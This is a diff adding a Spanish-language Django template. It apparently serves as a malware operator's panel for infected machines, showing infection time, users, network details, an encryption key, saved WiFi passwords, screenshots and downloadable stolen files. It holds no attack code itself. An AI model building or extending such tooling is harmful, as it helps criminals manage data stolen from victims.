@@ -1,0 +1,114 @@
+<!-- Nombre del equipo -->
+<h2>{{ parametro }}</h2>
+
+<!-- Tabla Maquina-->
+<h3>Info General </h3>
+<div> 
+    <p> Sistema operativo: {{ maquina.sistema_operativo }} </p> 
+    <p> Version: {{ maquina.version_sistema }} </p> 
+    <p> Fabricante: {{ maquina.fabricante }} </p> 
+    <p> IP Publica: {{ maquina.ip_publica }} </p> 
+    <p> Dominio: {{ maquina.dominio }} </p> 
+    <p> Tiempo de infeccion: {{ maquina.tiempo_de_infeccion_fecha }} {{ maquina.tiempo_de_infeccion_hora }} </p> 
+
+</div> 
+
+<br>
+
+<h3>Usuarios </h3>
+<!-- Tabla de usuarios-->
+<div>
+    <table>
+        <tr>
+            <td> Usuario </td>
+            <td> Estado  </td>
+       
+        {% for usuario in usuarios %}
+             <tr>   
+        
+                <td>{{ usuario.nombre }}</td>
+                <td>{{ usuario.estado }}</td>
+            
+            </tr> 
+        {% endfor %}
+         
+    </table>
+
+</div>
+
+<!-- Tabla Interfaces de red-->
+<br>
+<h3>Interfaces de red </h3>
+
+<div> 
+    <table> 
+        <tr>
+            <td> Nombre de interfaz   </td>
+            <td>Direccion IP</td>
+        </tr>
+
+            {% for red in redes %}
+
+            <tr>
+                <td> {{ red.interfaz }} </td> 
+                <td> {{ red.ip }} </td> 
+            </tr>
+
+            {% endfor %}
+
+        </table>
+</div> 
+
+<!-- Clave de cifrado -->
+ <br>
+<div>
+    <p><b>Clave de cifrado:</b> {{ password }}</p>
+
+</div>
+
+<!-- Redes Wifi -->
+<br>
+<h3>Redes WIFI </h3>
+<div> 
+    <table> 
+        <tr>
+            <td>SSID</td>
+            <td>Clave</td>
+        </tr>
+
+            {% for wifi in wifies %}
+
+            <tr>
+                <td> {{ wifi.ssid }} </td> 
+                <td> {{ wifi.clave }} </td> 
+            </tr>
+
+            {% endfor %}
+
+        </table>
+</div> 
+
+<h2>Imágenes:</h2>
+{% if imagenes_base64 %}
+    {% for imagen in imagenes_base64 %}
+        <img src="data:image/jpeg;base64,{{ imagen|safe }}" alt="Imagen de la máquina" />
+    {% endfor %}
+{% else %}
+    <p>No hay imágenes disponibles.</p>
+{% endif %}
+
+
+
+<p>Total de archivos encontrados: {{ archivos|length }}</p>
+
+{% if archivos %}
+    {% for archivo in archivos %}
+        <p>
+            <a href="{% url 'descargar_archivo' archivo.id %}" download="{{ archivo.archivo.nombre }}">
+                Descargar {{ archivo.archivo.nombre }}
+            </a>
+        </p>
+    {% endfor %}
+{% else %}
+    <p>No hay documentos disponibles.</p>
+{% endif %}
